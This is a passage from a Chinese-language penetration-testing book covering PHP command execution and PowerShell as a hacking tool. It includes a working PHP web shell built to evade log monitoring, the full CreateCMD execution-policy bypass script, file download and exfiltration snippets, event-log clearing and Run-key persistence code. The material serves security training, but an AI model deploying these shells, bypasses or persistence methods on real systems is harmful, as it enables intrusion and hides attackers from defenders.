  \n`system` 命令的工作方式与 `passthru` 类似，它也会将输出打印到屏幕。主要区别在于它还会返回一些数据。`system` 函数返回输出的最后一行，因此如果我们需要知道最后一行是什么，可以对其进行额外操作。虽然这有时很有用，但如果我们想要处理命令的输出，更可能使用\
  \ `exec` 函数。`exec` 函数接受两个参数：要运行的命令和用于存储结果的变量。结果将以数组形式放入结果变量中。默认情况下，`exec` 函数不会向屏幕打印任何内容。让我们看一个同时使用这两种类型的例子。\n\
  \n```\n<?php\n\nprint \"<PRE>\";\n\nexec(\"ls -l\",$out);\n\nprint_r($out);\n\n\
  print \"--------------------------------\\n\";\n\n$last = system(\"ls -l\");\n```\n\
  \n\n\n\n\n```\nprint \"</PRE>\";\n\n?>\n```\n\n我们的 `exec` 命令使用了两个参数。第一个参数 `ls -l`\
  \ 是我们的命令，第二个变量 `$out` 是输出数组。查看图 5.10 的输出时，可以看到当我们使用 `print_r` 打印 `$out` 的内容时，输出的每一行都是数组的一个不同元素。这样，如果我们想进行后续处理，就可以通过数组来操作输出。接下来，我们打印一条分隔线，并使用\
  \ `system` 命令。我们会将输出的最后一行捕获到 `$last` 变量中，但不会将其打印到屏幕上。我们将使用 `system` 执行另一个 `ls -l`，查看图\
  \ 5.10 时，会看到输出直接打印到屏幕上。\n\n![image](img/F000059f05-10-9781597497299.jpg)\n\n图 5.10\
  \ exectest.php 的输出\n\n现在我们已经研究了在 PHP 中执行命令的三种不同方式。我们可以利用这些方法来构建更复杂的脚本，例如一个 PHP shell。\n\
  \n警告\n\n在构建任何执行命令的脚本时，请谨慎确保脚本的安全性。如果脚本是公开可访问的，你不希望其他人使用它，因此请确保在部署此类工具后及时清理，以免自己成为导致主机被恶意攻击者入侵的源头。\n\
  \n## 综合运用\n\n拥有一个基本的 PHP shell 对于渗透测试非常有用，尤其是在我们能够在 Web 服务器上运行代码或能够包含自己的 PHP 文件时。为了实践我们刚刚学到的技能，我们将构建一个基本的\
  \ PHP shell。我们将涉及命令执行、表单处理、条件判断等内容。我们不希望任何人注意到我们在用脚本做什么，因此为了通过简单的日志监控更难被发现，我们将通过\
  \ POST 请求提交信息。我们希望能够向脚本提交 shell 命令并查看输出。为了方便，如果我们能保留之前的输出以便进行基本回滚，那就更好了。让我们开始构建简单的\
  \ PHP shell。\n\n```\n<?php\n\nif($_POST['command'])\n{\n   if($_POST['out'])\n \
  \  {\n     $out = $_POST['out'] . \"\\n\";\n     if(strlen($out) > 2000)\n     {$out\
  \ = substr($out,strlen($out) - 2000,2000);\n     }\n   }\n   $out .= \"> {$_POST['command']}\\\
  n\";\n   exec($_POST['command'],$data);\n   $out .= implode(\"\\n\",$data);\n}\n\
  ?>\n```\n\n我们的表单将提交两部分数据：一部分是我们想要执行的命令，另一部分是我们已经拥有并希望保留的输出。脚本开始时，我们检查 POST 数据中是否设置了\
  \ `command` 键。如果设置了，我们就需要处理；如果没有，事情就简单了，只需打印一个表单。一旦确定有命令要执行，我们查看 POST 数据中的 `out`\
  \ 键，判断是否有之前的输出。如果有，我们将 `$out` 变量设置为之前的数据，并追加一个新行，以便区分不同的命令。\n\n如果我们一直保留输出，随着脚本执行，提交的数据会越来越长，可能导致提交时间变长，并且在服务器日志中看起来异常，因此我们希望将字符串截断为\
  \ 2000 个字符。这样既能提供足够的回滚缓冲区来查看最近的操作，又不会保留三小时前的数据。我们检查字符串长度，如果大于 2000 个字符，则取最后 2000\
  \ 个字符，并将 `$out` 变量设置为该值。我们使用 `substr` 函数来实现，该函数从字符串中提取子串，第一个参数指定字符串，第二个参数指定起始位置，第三个参数指定要包含的字符数。我们将\
  \ `out` 作为字符串，字符串长度减 2000 作为起始点，2000 作为长度，以确保获取最后 2000 个字符。\n\n处理完之前的输出后，我们将刚刚提交的命令添加到输出中，以便能够看到执行了哪个命令生成了输出。我们在命令前加上\
  \ `>` 符号，以区分命令和输出，然后跟上表单提交的命令。接下来，我们使用 `exec` 函数执行提交的命令，并将输出存储在 `$out` 变量中。由于我们只想将数组合并成一个字符串，可以使用\
  \ `implode` 函数，将数组中的所有行用换行符连接起来，形成包含命令输出的单个字符串。然后将其追加到输出变量 `$out` 中。现在命令已执行，输出存储在变量中，完成困难部分后，我们来构建一个表单。\n\
  \n```\n<FORM METHOD=POST>\n<TEXTAREA NAME=out id=out style=\"width: 100%; height:90%\"\
  >\n<?php echo $out?>\n</TEXTAREA><BR>\nInput Command: <INPUT NAME=command id=command\
  \ TYPE=TEXT LENGTH=255><INPUT TYPE=SUBMIT>\n</FORM>\n```\n\n我们首先创建表单。指定提交方法为 POST，并且不指定\
  \ action，表示表单提交到自身。这样便于将这段代码嵌入其他应用程序。接下来，创建用于存储输出的文本区域。指定名称为 `out`，即前面表单处理代码中引用的变量。同时指定元素\
  \ ID 也为 `out`，然后为文本区域设置一些基本样式。我们希望文本区域占据大部分屏幕，因此宽度设为浏览器宽度的 100%，高度设为浏览器高度的 90%。这样调整浏览器大小时，表单仍能保持正确显示。对于文本区域中包含的数据，我们打开一个\
  \ PHP 代码块，输出之前构建的 `$out` 变量。这样每次提交后，输出就会显示在文本区域中。关闭文本区域后，我们需要一种提交命令的方式。为此，我们创建一个文本输入框，命名为\
  \ `command`，长度设为 255 个字符。唯一缺少的是提交按钮，因此添加一个，表单就完成了。\n\n现在我们已经有了一个功能完整的 PHP shell。然而，那些需要用户滚动到页面特定位置并点击输入框的网页很烦人。让我们修复这个问题，以免自找麻烦。通过一些基本的\
  \ JavaScript，我们可以让表单更易用。让我们为脚本添加这些收尾工作。\n\n```\n<script>\nvar ta = document.getElementById('out');\n\
  ta.scrollTop = ta.scrollHeight;\nvar cmd = document.getElementById('command');\n\
  cmd.focus();\n</script>\n```\n\n我们使用 `<script>` 标签告知浏览器将包含 JavaScript 代码。之前为元素指定\
  \ ID 就是为了在 JavaScript 中方便引用。使用 `var` 关键字创建一个新的 JavaScript 变量，命名为 `ta`。我们希望 `ta`\
  \ 指向 `out` 文本区域的 HTML 元素，最简单的方式是让文档对象模型（DOM）为我们查找该元素。DOM 是 HTML 文档的应用程序接口（API），允许我们查询文档属性并操作值。通过将\
  \ `ta` 赋值为输出文本区域框，我们就可以修改其属性。我们首先要做的是将文本区域滚动到底部。为此，将 `ta` 的 `ScrollTop` 属性设置为等于\
  \ `ScrollHeight`，这样文本区域就会滚动到底部。这将确保每次提交新命令时，它们始终可见。\n\n\n\n\n\n我们要做的第二件事是每次页面加载时将光标放入命令文本框。为此，我们创建一个\
  \ `cmd` 变量，并将其设置为命令输入框。我们的输入框有一个与之关联的方法，名为 `focus`，该方法会将光标置于输入框中。我们执行此方法，以便每次页面加载时都能开始输入，并位于表单的正确位置。尝试包含和不包含脚本的情况，看看区别。你的输出应类似于图\
  \ 5.11。\n\n![图片](img/F000059f05-11-9781597497299.jpg)\n\n图 5.11 PHP Shell 执行`id`命令的输出\n\
  \n## 总结\n\n我们从构建一些简单的 PHP 开始，一直到拥有一个可工作的 Shell。通过探索表单处理、条件语句、命令执行和循环，我们构建了文件下载器和用于枚举服务器信息的脚本。现在你应该具备了\
  \ PHP 基础，能够将这些任务应用到第 9 章中，并将这些技术应用于实际的渗透测试场景。虽然我们只是浅尝了 PHP 的所有功能，但你已经掌握了足够的基础知识，可以在业余时间自行深入学习。要研究更多\
  \ PHP 功能，请访问 PHP 网站[www.php.net](http://www.php.net)。在那里，你可以进一步研究我们已经看过的 PHP 函数，并查找\
  \ PHP 语言的在线文档。\n\n# 第 6 章\n\n# 使用 PowerShell 操控 Windows\n\n## 本章内容：\n\n• 处理 PowerShell\
  \ 中的执行策略\n\n• PowerShell 在渗透测试中的用途\n\n• PowerShell 与 Metasploit\n\n在第 1 章中，我们花了不少时间讨论微软的\
  \ PowerShell 以及如何用它来开发 Shell 脚本。其中一些脚本如果进一步开发，可用于常规任务，例如收集主机及其所在网络的信息。在本章中，我们将直接深入探讨如何将\
  \ PowerShell 用作黑客工具。\n\n直到最近，PowerShell 通常不被视为可用于攻击的工具。它有一套非常严格的权限限制，限制了我们在系统上能运行的内容（如第\
  \ 1 章所述），我们必须放宽这些权限才能运行最基本的脚本和命令。此外，如果不采取措施禁用这些安全措施，我们在系统上使用 PowerShell 几乎做不了什么……至少以前是这么认为的。\n\
  \n在 2010 年的 DEF CON 18 大会上，David Kennedy 和 Josh Kelley 做了一场关于 PowerShell 的演讲[[1]](#CHP006.html_BIB1)，讨论了如何将其用作攻击工具，如何绕过现有的安全措施，以及\
  \ PowerShell 在渗透测试场景中的一些有趣用途。得益于 Kennedy、Kelley 以及其他参与本次演讲中代码开发的人员的努力，我们现在有了更好的基础，能够以新颖有趣的方式使用\
  \ PowerShell。让我们开始探索，看看 PowerShell 能为我们做些什么。\n\n## 处理 PowerShell 中的执行策略\n\n如本章及第\
  \ 1 章所述，现有的执行策略限制了我们在 PowerShell 中能做的事情。在第 1 章中，我们不得不将执行策略更改为`RemoteSigned`才能使用脚本，但我们并没有真正讨论各个策略的具体含义。现在我们来详细说明。\n\
  \n### 执行策略\n\n共有四种执行策略：`Restricted`、`AllSigned`、`RemoteSigned`和`Unrestricted`。`Restricted`策略（也是默认执行策略）阻止我们运行任何\
  \ PowerShell 脚本，但允许我们以交互方式使用 Shell。\n\n`AllSigned`策略只允许运行由受信任发布者数字签名的脚本。`RemoteSigned`策略允许运行本地创建的脚本，但下载的脚本必须由受信任发布者数字签名。`Unrestricted`策略没有任何限制，允许运行来自任何来源的未签名脚本。这些执行策略可以按照第\
  \ 1 章中讨论的方式进行更改。\n\n某些执行策略所依据的签名是指脚本本身的数字签名。这些签名必须来自受信任的发布者，才能符合各种执行策略的要求。\n\n提示\n\
  \n实际上，我们可以创建自签名证书来为脚本签名，但脚本运行时（至少第一次）仍会收到警告。这个过程有点复杂，但互联网上有相关文章和教程可以指导我们完成。^(1)\
  \ 在渗透测试中，我们通常最好绕过执行策略，下一节将讨论这一点。\n\n理想情况下，我们希望将执行策略设置为`Unrestricted`，至少是`RemoteSigned`，这样我们就能在目标系统上运行脚本。然而，如第\
  \ 1 章所述，如果执行策略尚未如此设置，我们需要对系统进行一些更改。在渗透测试中，我们可能并不总是希望或能够更改系统设置。幸运的是，有一种方法可以绕过这个问题，无需任何更改，保持系统原始状态，同时允许我们运行任何脚本。\n\
  \n### 绕过策略\n\n为了绕过 PowerShell 执行策略施加的限制，我们可以使用由 Peters、Kelley 和 Kennedy 开发的`CreateCMD`代码[[2]](#CHP006.html_BIB2)。以下示例是上述作者开发的相同代码，为简洁起见省略了一些注释和用法。原始代码可在[www.secmaniac.com/download/](http://www.secmaniac.com/download/)获取。\n\
  \n```\n#\n# PowerShell CreateCmd Bypass by Kathy Peters, Josh Kelley (winfang) and\
  \ Dave Kennedy (ReL1K)\n# Defcon Release\n#\n#\n#\nparam($Filenames, [bool]$EncodeIt=$false);\n\
  \nif (-not $Filenames)\n{\n   Write-Host \"Usage: createcmd.ps1 [-Filenames] <string[]>\
  \ [-EncodeIt <bool>]\"\n   Write-Host \" Returns a powershell command line with\
  \ contents of <Filesnames>concatenated and \"\n   Write-Host \" encoded into a compressed\
  \ stream which will be uncompressed and invoked on startup.\"\n   Write-Host \"\
  \ Large code files may exceed 8K cmd limits of DOS and will not load correctly.\"\
  \n   Write-Host \" Do not use EncodeIt on large files. The command line will be\
  \ too long for DOS to handle.\"\n   Write-Host \" To write to a file that dos can\
  \ read, use ascii encoding. For example:\"\n   Write-Host \"  PS>.\\createcmd.ps1\
  \ mycode.ps1 '$false | Out-File mycmd.bat ascii\"\n   Write-Host \"  To concat multiple\
  \ files together, pass in an array of strings or output from ls like this:\"\n \
  \  Write-Host \"  PS>.\\createcmd.ps1 '$(ls myfile*.ps1) | Out-File mycmd.bat ascii\"\
  \n   return;\n}\n\n$contents = gc $Filenames;\n$ms = New-Object IO.MemoryStream\n\
  $cs = New-Object IO.Compression.DeflateStream ($ms, [IO.Compression.CompressionMode]::Compress);\n\
  $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII);\n$contents | %{\n\
  \   $sw.WriteLine($_);\n   }\n$sw.Close();\n\n$code = [Convert]::ToBase64String($ms.ToArray());\n\
  $command = \"Invoke-Expression '$(New-Object IO.StreamReader (\" +\n   \"'$(New-Object\
  \ IO.Compression.DeflateStream (\" +\n   \"'$(New-Object IO.MemoryStream (,'$([Convert]::FromBase64String('\"\
  $code'\")))), \" +\n   \"[IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();clear;'\"\
  Load complete.'\"\"\n\n# Command version that builds the code from args passed to\
  \ the script.\n```\n\n\n\n\n\n```powershell\n# Don’t use. -Command lets you pass\
  \ args to the command, # but -encodedCommand doesn’t, # which doesn’t help with\
  \ the\n\n# command line length problem.\n\n#$command_using_args = \"Invoke-Expression\
  \ ’$(New-Object IO.StreamReader (\" +\n\n# \"$(New-Object IO.Compression.DeflateStream\
  \ (\" +\n\n# \"’$(New-Object IO.MemoryStream #(,’$([Convert]::FromBase64String([string]::Join(’\"\
  ’\",’$args))))),\" +\n\n# \"[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::#\
  \ ASCII)).ReadToEnd();clear;’\"Load complete.’\"\"\n\n$doscommand = \"powershell.exe\
  \ -NoExit {0} ’\"{1}’\"\";\n\nif ($EncodeIt)\n\n{\n\n   $doscommand -f \"-encodedCommand\"\
  ,$([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command)));\n\n\
  }\n\nelse\n\n{\n\n $doscommand -f \"-Command\",$command.Replace(\"’\"\", \"\\’\"\
  \");\n\n}\n```\n\n让我们快速看一下这里在做什么。属性注释后的第一行实际上是接收脚本参数的行，使用了 `param`。这与我们在第 1 章中使用的方法本质上相同，但代码稍微少一些。在这里，我们从命令行接收文件名，并将\
  \ `$EncodeIt` 的值设为 false。然后我们使用 `gc`，它读取 `$Filenames` 中文件的内容（非常类似于 Linux 中的 `cat`），并将它们放入\
  \ `$contents` 中。我们还定义了变量 `$ms` 作为 `IO.MemoryStream` 对象的句柄，稍后我们将用它来存储一些数据。我们还需要分别设置\
  \ `$cs` 和 `$sw` 作为 `IO.Compression.DeflateStream` 和 `IO.StreamWriter` 对象的句柄。一旦所有对象设置完毕，我们将文件的压缩内容写入内存流，并关闭流写入器。\n\
  \n现在一切都已就绪，脚本内容也已存储，我们可以进行转换了。我们将内存流 `$ms` 中保存的文本的 Base64 转换字符串放入 `$code` 中。这就是最终会出现在我们的\
  \ `.bat` 文件中的代码。然后我们逆向执行之前压缩和转换脚本的过程，最终得到一个解压缩后的 ASCII 文本版本，并将其传递给 `Invoke-Expression`，以便在当前\
  \ shell 的上下文中执行代码。\n\n因此，最终我们将使用 `.\\createcmd.ps1 fileout.ps1 | Out-File fileout.bat\
  \ ascii` 来执行 `createcmd.ps1`。我们的测试脚本 `fileout.ps1` 只包含一行 `Set-Content -Encoding\
  \ utf8 test.txt \"test\"`，这将输出一个文件，以便我们能看到结果。最终我们会得到一个名为 `fileout.bat` 的文件，运行该文件将执行我们的原始代码并输出文本文件。\n\
  \n这段代码使我们能够完全绕过执行策略，无论源代码是什么，也无论系统上的执行策略级别设置为什么，都能执行我们的 PowerShell 代码。需要明确的是，我们实际上并没有更改执行策略级别，也没有对操作系统进行任何配置更改、修改注册表或执行任何其他类似步骤。我们只是完全绕过了安全措施。\n\
  \n**警告**\n\n目前，`CreateCMD` 代码非常有效地帮助我们绕过了微软作为安全措施对 PowerShell 脚本施加的策略限制。当然，我们无法保证这种情况会永远持续下去，也无法保证微软不会发布补丁或新版本的\
  \ PowerShell 来堵住这个特定的漏洞。如果我们发现 `CreateCMD` 代码完全失效，或者在某些版本的 PowerShell 上无法工作，那么可能需要检查一下是否确实发生了这种情况。\n\
  \n有了这种能力，从渗透测试的角度来看，PowerShell 很快就变得更加有用。虽然我们当然可以使用社会工程技术或木马等工具进行攻击，让用户自己更改 PowerShell\
  \ 的执行策略，但如果我们有其他方法达到目的，我们宁愿不采取这些步骤。\n\n使用此过程绕过执行策略的一个注意事项是，虽然我们可以通过这种方法有效地忽略执行策略，但这并非万能药。PowerShell\
  \ 中仍然有一些活动需要我们拥有管理员权限，如果我们无法获得这些权限，可能会陷入困境。\n\n让我们简要讨论一下我们最初如何进入系统，以及进入后可以用 PowerShell\
  \ 做什么。\n\n### 进入系统\n\n为了使用我们的任何 PowerShell 好东西，我们首先需要找到进入系统的方法。根据我们在机器上具体想做什么，我们可能还需要管理员权限。有许多任务我们可以仅使用标准用户帐户的权限来执行，例如\
  \ ping 扫描或端口扫描，因为这些只需要任何帐户都拥有的正常访问级别。而要更改设置或执行通常需要管理员权限的系统操作，我们很可能也需要从 PowerShell\
  \ 获得相同的权限。\n\n由于使用商业或开源工具利用系统漏洞的具体细节并非本书的重点，我们不会详细讨论如何实施攻击以获得此类访问权限。这个话题超出了我们的范围，并且是整本书的主题。\n\
  \n**注意**\n\n对于那些希望了解如何进入我们想要使用 PowerShell 脚本的系统，或者使用本书讨论的其他语言编写的工具的人来说，有很多优秀的书籍涉及这个主题。其中一些比较知名的有：\n\
  \n- *反黑客实战：计算机攻击与有效防御逐步指南*，第 2 版（ISBN: 978-0-13-148104-6），作者：Ed Skoudis\n- *灰帽黑客：道德黑客手册*，第\
  \ 3 版（ISBN: 978-0071742559），作者：Allen Harper, Shon Harris, Jonathan Ness, Chris Eagle,\
  \ Gideon Lenkey, 和 Terron Williams\n- *黑客大曝光™ 6：网络安全秘密与解决方案*（ISBN: 978-0071613743），作者：Start\
  \ McClure, Joel Scambray, 和 George Kurtz\n\n为了快速总结进入系统的过程，我们需要执行以下步骤：\n\n- 对系统进行端口扫描，以发现任何开放端口。\n\
  - 找出这些端口上运行的服务以及服务的具体版本。\n- 研究以发现特定于任何易受攻击服务的漏洞。\n- 找到或创建针对该漏洞的利用程序，并利用它进入系统。\n\n\
  如果我们攻击一个未打补丁的 Windows 7 系统，举一个相对简单的例子，我们可以使用多种漏洞利用程序，例如 MS10-046^(2)（在 Metasploit\
  \ 中可用）来获得系统的远程 shell。\n\n在本章后面，我们将看看可以用 PowerShell 和 Metasploit 做什么，并更仔细地研究获取 Windows\
  \ 7 系统访问权限的过程。\n\n## PowerShell 在渗透测试中的用途\n\n在渗透测试场景中，PowerShell 有许多用途。由于 PowerShell\
  \ 可以访问微软的 .NET 工具集，并且其自带的许多现有功能都是为系统管理设计的，这也为渗透测试人员提供了极大的便利。我们将介绍一些 PowerShell 的示例用途，例如控制进程和服务、与事件日志交互、通过网络获取和发送文件，以及与注册表交互。\n\
  \n### 控制进程和服务\n\n\n\n\n\n由于这里的示例非常简单，我们将以交互模式使用 PowerShell 来运行它们，这一点在本章和第 1 章中都没有详细讨论。我们可以直接在\
  \ PowerShell shell 的提示符下发出命令，并将数据返回到控制台。例如，如果我们想获取系统上所有正在运行的进程列表，可以执行 `Get-Process`，正如我们在第\
  \ 1 章中讨论的那样。考虑到 Windows 系统上通常运行着大量进程，这会导致大量数据在控制台上滚动显示。\n\n为了获得更具体的结果，我们可以包含进程名称。为了提供一个示例进程来查看，我们只需在\
  \ PowerShell 提示符下输入 `Notepad` 即可启动记事本。我们也可以专门使用 `Start-Process` cmdlet 来启动进程，运行\
  \ `StartProcess Notepad`。一旦记事本启动，我们可以通过运行 `Get-Process notepad` 来获取其进程信息。返回的输出应该类似于图\
  \ 6.1 所示。\n\n![image](img/F000060f06-01-9781597497299.jpg)\n\n图 6.1 Get-Process\
  \ 输出\n\n现在我们有了一个可以操作的进程，就可以着手终止它了。在 PowerShell 中，我们可以使用 `Stop-Process` cmdlet 来终止进程。`Stop-Process`\
  \ 可以使用进程 ID 或进程名称作为参数来运行。如果使用进程 ID，我们可以直接运行 `Stop-Process 13768`。如果使用进程名称，则需要添加一个参数，例如\
  \ `Stop-Process –processname notepad`。\n\n操作服务与操作进程非常相似。为了获取服务列表，我们可以运行 `Get-Service`。与进程类似，`Get-Service`\
  \ 加上服务名称可以获取特定服务的信息，例如 `Get-Service Fax`。输出应该类似于图 6.2 所示。\n\n![image](img/F000060f06-02-9781597497299.jpg)\n\
  \n图 6.2 Get-Service 输出\n\n`Get-Service` 返回的基本信息会提供进程名称及其当前状态。然后我们可以分别使用 `Start-Service`、`Stop-Service`\
  \ 或 `Restart-Service` 来启动、停止或重启服务。通常，我们需要管理员权限才能操作服务。\n\n### 与事件日志交互\n\n在 PowerShell\
  \ 中处理事件日志是一项非常简单的任务。微软为我们提供了一个简单的接口来操作它们，尽管存在一些限制。同样，我们将以交互模式查看如何在 PowerShell 中处理事件日志，就像本节前面处理进程一样。\n\
  \n在目标系统上，我们可能首先想对事件日志做的事情是查看系统上已有的日志。为此，我们可以使用 `Get-EventLog` cmdlet，并加上 list 参数，例如\
  \ `Get-EventLog –List`。运行此 cmdlet 时，输出应该类似于图 6.3 所示。\n\n![image](img/F000060f06-03-9781597497299.jpg)\n\
  \n图 6.3 列出 Windows 上的事件日志\n\n方便的是，一旦我们获得了事件日志列表，就可以使用相同的 cmdlet 加上不同的参数来列出特定日志的内容。当我们查看给定系统上的日志时，其中很可能包含大量信息，因此我们还需要对返回的结果进行过滤，除非我们只是将日志内容转储到文件中。我们可以使用\
  \ `–newest` 参数与 `Get-EventLog` 一起获取指定日志的最后几条消息，例如 `Get-EventLog –newest 5 Application`。这将给出类似于图\
  \ 6.4 所示的输出。\n\n![image](img/F000060f06-04-9781597497299.jpg)\n\n图 6.4 Get-EventLog\
  \ 输出\n\n我们还可以使用 `Clear-EventLog` cmdlet 轻松清除事件日志。为此，我们需要指定要清除的日志以及日志所在系统的名称，例如 `Clear-Eventlog\
  \ –log Application –ComputerName .`（`–ComputerName` 后面的空格和句点是必需的；没有它们，此命令将无法工作）。这是需要管理员权限才能运行此特定\
  \ PowerShell 代码的一个领域。如果我们不是管理员，将会收到“权限被拒绝”的错误消息。\n\n### 通过网络获取和发送文件\n\n在渗透测试期间访问系统时，我们可能希望将文件拉取到系统上以本地加载其他工具，或者将信息发送出系统以进行数据外泄。我们可以使用\
  \ PowerShell 相对轻松地执行多种类型的网络活动。在 Linux 系统上，从 Web 服务器下载数据最有用的工具之一是 `wget`。方便的是，我们可以通过一个快速的\
  \ PowerShell 脚本和一点 .NET 魔法来复制其更基本的功能。只要我们可以写入下载位置，就应该能够以普通用户的权限执行此脚本。\n\n```\n$src\
  \ = \"http://nmap.org/dist/nmap-5.51-setup.exe\"\n$dest = \"c:\\temp\\nmap-5.51-setup.exe\"\
  \n$web = New-Object System.Net.WebClient\n$web.DownloadFile($src, $dest)\n```\n\n\
  让我们快速看一下我们在这里做了什么。我们首先获取包含要下载的 URL 的参数，该参数来自我们在命令行中传递的参数。这里我们还使用了 `param` 来处理参数，正如我们在本章前面看到的那样，这与我们在第\
  \ 1 章中看到的方法略有不同。在 `$path` 变量中，我们放置了当前目录的位置，下载的文件将保存在那里。为了使脚本更灵活，我们可能还想从参数中获取路径，这是一个很容易的修改。\n\
  \n这里我们实例化了一个用于与 Web 交互的对象 `System.Net.WebClient`，并使用 `$web` 作为其句柄。最后，我们在对象的句柄上调用\
  \ `DownloadFile` 方法，传递要下载的 URL 以及存储位置，例如 `$web.DownloadFile($url, $path)`。这是一个相当简单的代码片段，用于在\
  \ Windows 机器上处理 Web 流量。\n\n有许多非常方便的对象和方法可以用来处理其他类型的交易和流量。使用 `System.Net.WebClient`，我们还可以利用\
  \ `UploadFile` 方法向相反方向发送文件，这在处理 Web 交易时可能非常有用，但我们也可以使用 `System.Net.WebClient` 进行\
  \ FTP，无需进行重大更改。\n\n```\n$src = \"ftp://ftp.fr.netbsd.org/pub/pkgsrc/distfiles/netcat-0.7.1.tar.gz\"\
  \n$dest = \"c:\\temp\\netcat.tar.gz\"\n$ftp = New-Object System.Net.WebClient\n\
  $ftp.DownloadFile($src, $dest)\n#$ftp.UploadFile($src, $dest) #a quick change makes\
  \ this an upload\n```\n\n当然，这与我们刚才看到的 Web 下载代码非常相似，这是合理的，因为我们使用的是相同的对象和方法。由于我们执行的是非常相似的操作，唯一的真正区别在于文件的源和/或目标位于不同的协议上。`System.Net.WebClient`\
  \ 在内部透明地为我们处理所有协议差异。\n\n正如我们在第 1 章中讨论的那样，我们可以访问 .NET 中大量的对象，其中许多与网络相关。在许多情况下，我们可以找到现有的对象和方法，用于我们可能想要在网络上传输文件的大多数常见任务。对于无法适用这些对象和方法的特殊情况，互联网上存在大量用户生成的代码供我们使用和扩展。此外，我们还可以访问操作系统或已安装应用程序中通过命令行界面提供的几乎所有其他功能。\n\
  \n提示\n\n\n\n\n任何从未接触过`Netcat`^(3)的人都错过了一个具有惊人灵活性的主要渗透测试工具。`Netcat`可用于许多操作系统，并且在某些系统中，它可能是默认安装的一部分。`Netcat`本质上允许我们处理传入和传出的网络流量（或两者），并通过网络将文件或数据移动到我们关心的任何端口。对于那些有兴趣了解`Netcat`功能的人，可以查阅由\
  \ Jan Kanclirz Jr.编辑的《*Netcat Power Tools*》（ISBN: 978-1-59749-257-7, Syngress）一书。\n\
  \n有了像`Netcat`这样的工具（我们可以为 Windows 操作系统下载并通过 PowerShell 轻松控制），我们可以在网络上移动文件，打开 shell\
  \ 或反向 shell，并执行各种类似的任务。\n\n### 与注册表交互\n\nMicrosoft 操作系统中的注册表最初出现在 Windows 3.1 中，是一个保存\
  \ Microsoft 操作系统及其上安装的应用程序配置设置的数据库。我们可以使用注册表来操纵应用程序的功能（或阻止它们运行）、操作系统启动时发生的情况，以及各种其他类似任务。\n\
  \n注册表本质上是分层的，通常在用于访问它的图形工具中显示为一系列文件夹。在层次结构的每一层中，我们可能会找到额外的层次结构级别，称为“键”，以及单个条目，称为“值”。值是一对包含名称和相关数据的组合。\n\
  \n在注册表中，我们可以找到五个主要部分，通常称为“配置单元”：\n\n- `HKEY_LOCAL_MACHINE` (`HKLM`) – 保存本地计算机的设置\n\
  - `HKEY_CURRENT_CONFIG` (`HKCC`) – 保存启动时生成的信息\n- `HKEY_CLASSES_ROOT` (`HKCR`) –\
  \ 保存有关应用程序的信息\n- `HKEY_USERS` (`HKU`) – 保存`HKEY_CURRENT_USER`条目的超集\n- `HKEY_CURRENT_USER`\
  \ (`HKCU`) – 保存与当前登录用户相关的设置\n\n这些配置单元存在于大多数 Windows 操作系统中，根据所使用的具体版本略有不同，并且某些配置单元在应用程序编程接口（API）之外无法访问。\n\
  \nPowerShell 为我们提供了一个非常有趣且方便的 Windows 注册表接口。PowerShell 将注册表显示为文件系统，我们可以使用`cd`（更改目录）命令来访问它，使用前面列出的缩写名称，就像我们访问普通文件系统的任何其他部分一样：例如，`cd\
  \ HKLM:`。一旦进入，我们可以使用`dir`来显示`HKLM`下的键。我们应该会看到类似于图 6.5 所示的输出。\n\n![image](img/F000060f06-05-9781597497299.jpg)\n\
  图 6.5 在 PowerShell 中浏览注册表\n\n我们还会看到一些关于注册表访问受限的错误，这对于从 Vista 开始的大多数 Windows 操作系统来说是正常的。从这里，我们可以在`HKLM`下的注册表部分中浏览。\n\
  \n对于那些提前尝试导航到所有不同注册表配置单元的人来说，我们可能会发现只有两个配置单元可以直接访问：`HKLM`和`HKCU`。这些是 PowerShell\
  \ 默认配置访问的唯一配置单元。幸运的是，我们可以毫不费力地创建其他配置单元：\n\n```\nNew-PSDRIVE -name HKCC -PSProvider\
  \ Registry -Root HKEY_CURRENT_CONFIG\nNew-PSDRIVE -name HKCR -PSProvider Registry\
  \ -Root HKEY_CLASSES_ROOT\nNew-PSDRIVE -name HKU -PSProvider Registry -Root HKEY_USERS\n\
  ```\n\n要创建对这些额外配置单元的访问，我们不需要超出系统用户权限的任何特权。在每次输入后，我们应该能够`cd`到新的注册表配置单元，并使用`dir`查看其内容，类似于图\
  \ 6.6 所示。\n\n![image](img/F000060f06-06-9781597497299.jpg)\n图 6.6 在 PowerShell 中访问\
  \ HKCC\n\n一旦我们到达注册表结构中需要的位置，我们需要使用不同的命令来查看键内的各个值。使用`dir`只会显示层次结构中任何特定位置的子键，而不是值，这有点反直觉。\n\
  \n让我们快速看一下注册表中一些有趣的值。在大多数 Windows 操作系统中，如果我们在`HKLM:\\SOFTWARE\\Microsoft\\Windows\\\
  CurrentVersion\\Run`中放置一个值，并且该值包含一个指向可执行程序的指针，那么每当操作系统启动时，该特定程序就会被启动。当我们购买一台充满垃圾软件的新计算机时，所有这些软件都会在系统启动时加载，这通常是所有程序启动的地方。如果我们运行`Get-ItemProperty\
  \ \"hklm:\\software\\microsoft\\windows\\currentversion\\run\"`，我们应该会看到类似于图 6.7\
  \ 所示的输出，尽管各个条目会因机器而异。每个值及其关联数据都指向存储在文件系统中的特定已安装应用程序或可执行脚本。\n\n![image](img/F000060f06-07-9781597497299.jpg)\n\
  图 6.7 启动时启动应用程序的注册表值\n\n如果我们想引入自己的新应用程序在启动时运行，我们只需要创建一个新条目，所以让我们尝试一下。鉴于这是一个非常常见的注册表位置，我们可能想要写入，而且路径有点长，不方便重复输入，我们将编写一个小脚本来处理在适当位置创建我们的值。\n\
  \n```\nGet-ItemProperty \"HKLM:\\software\\microsoft\\windows\\currentversion\\\
  run\"\n$regpath = \"HKLM:\\software\\microsoft\\windows\\currentversion\\run\"\n\
  $apppath = \"%windir%\\system32\\calc.exe\"\n$name = \"Calc\"\nGet-ItemProperty\
  \ \"HKLM:\\software\\microsoft\\windows\\currentversion\\run\"\nSet-ItemProperty\
  \ -path $regpath -name $name -value $apppath\nGet-ItemProperty \"HKLM:\\software\\\
  microsoft\\windows\\currentversion\\run\"\n```\n\n这是一个非常简单的脚本，但我们将快速浏览一下。首先，我们应该知道，如果我们不是管理员，这是\
  \ PowerShell 会因权限问题而失败的另一个地方。如果我们尝试以普通用户身份运行脚本，将会出现类似于`Set-ItemProperty: Requested\
